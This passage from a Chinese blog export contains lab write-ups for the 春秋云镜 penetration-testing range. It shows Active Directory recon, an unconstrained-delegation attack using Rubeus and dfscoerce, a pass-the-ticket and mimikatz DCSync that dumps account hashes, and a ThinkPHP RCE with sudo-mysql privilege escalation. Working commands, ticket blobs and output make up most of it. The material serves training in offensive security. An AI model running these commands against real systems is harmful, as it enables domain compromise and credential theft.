system</span><br><span class=\"line\">[i] Domain SID:</span><br><span class=\"line\">                    [+] S-1-5-21-1913786442-1328635469-1954894845</span><br><span class=\"line\">[i] Domain MAQ found</span><br><span class=\"line\">                    [+] 10</span><br><span class=\"line\">[i] Domain Account Policy found</span><br><span class=\"line\">                    [+] pwdHistory: 24</span><br><span class=\"line\">                    [+] minPwdLength: 7</span><br><span class=\"line\">                    [+] minPwdAge: 1(day)</span><br><span class=\"line\">                    [+] maxPwdAge: 42(day)</span><br><span class=\"line\">                    [+] lockoutThreshold: 0</span><br><span class=\"line\">                    [+] lockoutDuration: 30(min)</span><br><span class=\"line\">[i] Domain Controllers: 1 found</span><br><span class=\"line\">                    [+] DC01$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.4.7</span><br><span class=\"line\">[i] ADCS has not found!</span><br><span class=\"line\">[i] Domain Exchange Server: 0 found</span><br><span class=\"line\">[i] Domain All DNS:</span><br><span class=\"line\">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class=\"line\">[i] Domain Trusts: 0 found</span><br><span class=\"line\">[i] SPN: 39 found</span><br><span class=\"line\">[i] Domain GPOs: 2 found</span><br><span class=\"line\">[i] Domain Admins: 1 users found</span><br><span class=\"line\">                    [+]Administrator</span><br><span class=\"line\">[i] Enterprise Admins: 1 users found</span><br><span class=\"line\">                    [+]Administrator</span><br><span class=\"line\">[i] administrators: 1 users found</span><br><span class=\"line\">                    [+]Administrator</span><br><span class=\"line\">[i] Backup Operators: 0 users found</span><br><span class=\"line\">[i] Users: 6 found</span><br><span class=\"line\">[i] User with Mail: 0 found</span><br><span class=\"line\">[i] Only_name_and_Useful_Users: 3 found</span><br><span class=\"line\">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class=\"line\">[i] Locked Users: 0 found</span><br><span class=\"line\">[i] Disabled Users: 3 found</span><br><span class=\"line\">[i] Users with passwords not set to expire: 2 found</span><br><span class=\"line\">[i] Domain Computers: 5 found</span><br><span class=\"line\">[i] Only_name_and_Useful_computers: 5 found</span><br><span class=\"line\">[i] Groups: 49 found</span><br><span class=\"line\">[i] Domain OUs: 1 found</span><br><span class=\"line\">[i] LAPS Not found</span><br><span class=\"line\">[i] LAPS passwords: 0 found</span><br><span class=\"line\">[i] SensitiveDelegate Users: 0 found</span><br><span class=\"line\">[i] AsReproast Users: 0 found</span><br><span class=\"line\">[i] Kerberoast Users: 1 found</span><br><span class=\"line\">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br><span class=\"line\">[i] SIDHistory Users: 0 found</span><br><span class=\"line\">[i] CreatorSID Users: 2 found</span><br><span class=\"line\">                    [+] WIN-3X7U15C2XDM$  ==&gt;&gt;&gt;  Marcus</span><br><span class=\"line\">                    [+] WIN-YUUAW2QG9MF$  ==&gt;&gt;&gt;  Marcus</span><br><span class=\"line\">[i] RBCD Users: 0 found</span><br><span class=\"line\">[i] Unconstrained Deligation Users: 1 found</span><br><span class=\"line\">                    [+] WIN19$</span><br><span class=\"line\">[i] Constrained Deligation Users: 0 found</span><br><span class=\"line\">[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST</span><br><span class=\"line\">[i] CSVs written to &#x27;csv&#x27; directory in C:\\Users\\lv\\Desktop</span><br><span class=\"line\">[i] Execution took 1.0246743s</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[i] Unconstrained Deligation Users: 1 found</span><br><span class=\"line\">                    [+] WIN19$</span><br></pre></td></tr></table></figure>\n\n<p>WIN19$有非约束委派，上传Rubeus进行监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\lv\\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class=\"line\"></span><br><span class=\"line\">   ______        _</span><br><span class=\"line\">  (_____ \\      | |</span><br><span class=\"line\">   _____) )_   _| |__  _____ _   _  ___</span><br><span class=\"line\">  |  __  /| | | |  _ \\| ___ | | | |/___)</span><br><span class=\"line\">  | |  \\ \\| |_| | |_) ) ____| |_| |___ |</span><br><span class=\"line\">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class=\"line\"></span><br><span class=\"line\">  v2.2.0</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: TGT Monitoring</span><br><span class=\"line\">[*] Target user     : DC01$</span><br><span class=\"line\">[*] Monitoring every 1 seconds for new TGTs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后使用dfscoerce让DS向WIN19$认证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u &quot;WIN19$&quot; -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7</span><br><span class=\"line\">[-] Connecting to ncacn_np:172.22.4.7[\\PIPE\\netdfs]</span><br><span class=\"line\">[+] Successfully bound!</span><br><span class=\"line\">[-] Sending NetrDfsRemoveStdRoot!</span><br><span class=\"line\">NetrDfsRemoveStdRoot</span><br><span class=\"line\">ServerName:                      &#x27;WIN19\\x00&#x27;</span><br><span class=\"line\">RootShare:                       &#x27;test\\x00&#x27;</span><br><span class=\"line\">ApiFlags:                        1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\lvv\\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class=\"line\"></span><br><span class=\"line\">   ______        _</span><br><span class=\"line\">  (_____ \\      | |</span><br><span class=\"line\">   _____) )_   _| |__  _____ _   _  ___</span><br><span class=\"line\">  |  __  /| | | |  _ \\| ___ | | | |/___)</span><br><span class=\"line\">  | |  \\ \\| |_| | |_) ) ____| |_| |___ |</span><br><span class=\"line\">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class=\"line\"></span><br><span class=\"line\">  v2.2.0</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: TGT Monitoring</span><br><span class=\"line\">[*] Target user     : DC01$</span><br><span class=\"line\">[*] Monitoring every 1 seconds for new TGTs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[*] 2025/4/18 4:54:32 UTC - Found new TGT:</span><br><span class=\"line\"></span><br><span class=\"line\">  User                  :  DC01$@XIAORANG.LAB</span><br><span class=\"line\">  StartTime             :  2025/4/18 10:28:04</span><br><span class=\"line\">  EndTime               :  2025/4/18 20:28:04</span><br><span class=\"line\">  RenewTill             :  2025/4/25 10:28:04</span><br><span class=\"line\">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class=\"line\">  Base64EncodedTicket   :</span><br><span class=\"line\"></span><br><span class=\"line\">    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRn</span><br><span class=\"line\">    dBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6F05kURrtAGLPwnEu0x0RxvAPS3m5aRx/bjVuGQLR7b0+L</span><br><span class=\"line\">    x5X557jubFee2VfyECSf1RICTWkdJttbkCj4s6IMQrVpe8jFgy3Uki4NC0WdUfzH1nIiJSCq0lRPzgI88NGOrQEbDaurBzq150lY</span><br><span class=\"line\">    i68ssuARb6DWCu6HYLjq66NSI53LNGAHqlNVoU+83ZOhJboPDjY2XL74OXFh0Qr57fWAbUOWegzVPHFicFshmeiMv111lfJr0X6Q</span><br><span class=\"line\">    aqATuWtvoSsDI+/v3HyGMlqmlqJmmt0coW9z0L6V52yL7XA2YfXod7N+hWb/gclV5+C1G7GNj/uM3Zi5DyJ9kk+IuWHKWRRrz7JR</span><br><span class=\"line\">    iPDy9zMJWBDgeMsEEmB/uh492tq+i3g8o49PocQ2TqcnRBPCiAEbpWhpz/LDb6P6f+ySqupcTcM5q9G+6CT6Rj/aMDAjqZEsRpfb</span><br><span class=\"line\">    agn3XEjKWbF+kpAuuvr+eGd0xICbySdM21JRTjqZmZmUPkEe5Y0zKH+wVUUVJOAv8BVeKirxdKtYyDYiudFtUUGGkIzt2Z3J1yJY</span><br><span class=\"line\">    GA8B90UklsraI8O6Q83i2nE11WkcxEXceYh7PBoeL6ivncb8UqZK2Nh07+1QlILNCx+5WFFLjNSoBLhofg3TIsPCr2zFNXTNbBPv</span><br><span class=\"line\">    zP+bjqJawf7BY0KUWNLvgAltKMXX1T9pzNREspsKwRMjXZgsyTbil3reoEciEexNtXVhWxrk+xbp9DIL/74f4rafpIMsi7myoH6a</span><br><span class=\"line\">    u1kjVexmmP4wOWp7KGvMm1gNp+XeakyHPiFlqIt4V0b4KGfd9Zd3rtQI3gtM7oeUm6PDlEn9vK0MVBpZZJeW6IDkZdXC7SBmPM1z</span><br><span class=\"line\">    p0uno3wGRj0MuqqnPaV8XRJR0sEaNGD8HABfQkdCMHm5GQ8w71AIEy9i2otNPegf6P0j4EPsNwtyo2o97GKu/y27tvKv1FH43S4G</span><br><span class=\"line\">    ij5gjiKBxIn2JtQ9oPvb0v+2SZWU08xE6v+b79PsWvr5STsl4eUJHnTuXizQfsY597gQAVgKD7vKeIXEsgb11VVP9HCtUjxCmBNS</span><br><span class=\"line\">    25QzZvXbuWkEJ6k/7AYu0qvT3auHC1cbf4MmuMrc/DlT4MphkuUF5j8hfSEgEAVWhVZVuPZA3v6C+O8PYmDl1d9lT6JjZ5wuQrAG</span><br><span class=\"line\">    Dwt7+cZ9wzuWLDUkB1dtiTm0cuFLXAmOLLDjpSWxIXK2B9TNAagAq2slNrb775ovLLdo/swtuRAKazjqgCAygra59RWoqP+loVv8</span><br><span class=\"line\">    nxii1cB/M4tFLpGuZlTdOnyME8JT8D40++QW5IxMPffywi5tpjhDUnVC1wtK49BOaljvJKH8LcWHWyALrv2j8De6HPabKhCcnDiY</span><br><span class=\"line\">    /w7QHVbcAh/Jo64uH2aYRSQEz5j7oGpAAP3ENCvzEaV8e/53wwRqjyife177PX7j9/ZfoqzfiRnr1kjeHIZsGw5zYyTmLbB/91Np</span><br><span class=\"line\">    RN2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCClV6tyB9NAYvRnxe9wuyHOhysxVh63TouQkdqL</span><br><span class=\"line\">    8MLxbKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxODAyMjgwNFqmERgPMjAy</span><br><span class=\"line\">    NTA0MTgxMjI4MDRapxEYDzIwMjUwNDI1MDIyODA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9S</span><br><span class=\"line\">    QU5HLkxBQg==</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Ticket cache size: 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>导入 TGT 然后 DCSync</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync /all /csv&quot;</span><br><span class=\"line\">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class=\"line\">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class=\"line\">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class=\"line\">[rpc] Service  : ldap</span><br><span class=\"line\">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class=\"line\">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class=\"line\">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class=\"line\">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class=\"line\">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class=\"line\">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class=\"line\">1000    DC01$   23414273a692373e6e076d5fdbb2c213        532480</span><br><span class=\"line\">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class=\"line\">1103    FILESERVER$     dd213f63df5b16b2daa567705ca88ac7        4096</span><br><span class=\"line\">1104    WIN19$  b6547b5e9c27c42b5cb096f1c922bc3a        528384</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以拿到域控的哈希</p>\n<p>然后登录即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Administrator\\flag&gt; type flag04.txt</span><br></pre></td></tr></table></figure>\n\n","categories":["春秋云镜"],"tags":["靶机"]},{"title":"春秋云镜-Initial","url":"/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/","content":"<h1 id=\"FLAG1\"><a href=\"#FLAG1\" class=\"headerlink\" title=\"FLAG1\"></a>FLAG1</h1><p>首先进行信息搜集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ../pentest/fscan/fscan2 -h 39.99.232.66</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-18 08:00:46] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-18 08:00:46] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-18 08:00:46] [INFO] 最终有效主机数量: 1</span><br><span class=\"line\">[2025-04-18 08:00:46] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-18 08:00:46] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:22</span><br><span class=\"line\">[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:80</span><br><span class=\"line\">[2025-04-18 08:00:46] [SUCCESS] 服务识别 39.99.232.66:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-18 08:00:51] [SUCCESS] 服务识别 39.99.232.66:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-18 08:00:55] [INFO] 存活端口数量: 2</span><br><span class=\"line\">[2025-04-18 08:00:55] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-18 08:00:55] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-18 08:00:55] [SUCCESS] 网站标题 http://39.99.232.66       状态码:200 长度:5578   标题:Bootstrap Material Admin</span><br><span class=\"line\">[2025-04-18 08:00:57] [SUCCESS] 目标: http://39.99.232.66:80</span><br><span class=\"line\">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class=\"line\">  漏洞名称: poc1</span><br><span class=\"line\">  详细信息:</span><br><span class=\"line\">        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><br><span class=\"line\">[2025-04-18 08:01:01] [SUCCESS] 扫描已完成: 3/3</span><br></pre></td></tr></table></figure>\n\n<p>80端口存在thinkphp的漏洞，直接工具一把梭了，拿到shell后提一下权,sudo可以无密码执行mysql，mysql提权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(www-data:/) $ sudo -l</span><br><span class=\"line\">Matching Defaults entries for www-data on ubuntu-web01:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\">User www-data may run the following commands on ubuntu-web01:</span><br><span class=\"line\">    (root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mysql -e &#x27;\\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>拿到了flag的第一部分,写一个公钥进去，然后ssh登录，上传fscan再做一个代理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(www-data:/tmp) $ ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 00:16:3e:25:0c:72 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class=\"line\">       valid_lft 315359017sec preferred_lft 315359017sec</span><br><span class=\"line\">    inet6 fe80::216:3eff:fe25:c72/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@ubuntu-web01:~# ./fscan -h 172.22.1.15/24</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] CIDR范围: 172.22.1.0-172.22.1.255</span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] 生成IP范围: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)</span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] 解析CIDR 172.22.1.15/24 -&gt; IP范围 172.22.1.0-172.22.1.255</span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] 最终有效主机数量: 256</span><br><span class=\"line\">[2025-04-18 20:14:45] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)</span><br><span class=\"line\">[2025-04-18 20:14:48] [INFO] 存活主机数量: 4</span><br><span class=\"line\">[2025-04-18 20:14:48] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:88</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:80</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:80</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:22</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:445</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:445</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:445</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:389</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:139</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:139</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:139</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:135</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:135</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:135</span><br><span class=\"line\">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:3306</span><br><span class=\"line\">[2025-04-18 20:14:49] [SUCCESS] 服务识别 172.22.1.15:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.18:3306 =&gt; [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server]</span><br><span class=\"line\">[2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.2:88 =&gt;</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:445 =&gt;</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:445 =&gt;</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:445 =&gt;</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:80 =&gt; [http]</span><br><span class=\"line\">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.15:80 =&gt; [http]</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.18:135 =&gt;</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.2:135 =&gt;</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.21:135 =&gt;</span><br><span class=\"line\">[2025-04-18 20:15:54] [INFO] 存活端口数量: 15</span><br><span class=\"line\">[2025-04-18 20:15:54] [INFO] 开始漏洞扫描</span><br><span class=\"line\">[2025-04-18 20:15:54] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.1.21</span><br><span class=\"line\">主机名: XIAORANG-WIN7</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.1.21</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.1.2</span><br><span class=\"line\">主机名: DC01</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.1.2</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果</span><br><span class=\"line\">目标主机: 172.22.1.18</span><br><span class=\"line\">主机名: XIAORANG-OA01</span><br><span class=\"line\">发现的网络接口:</span><br><span class=\"line\">   IPv4地址:</span><br><span class=\"line\">      └─ 172.22.1.18</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.15        状态码:200 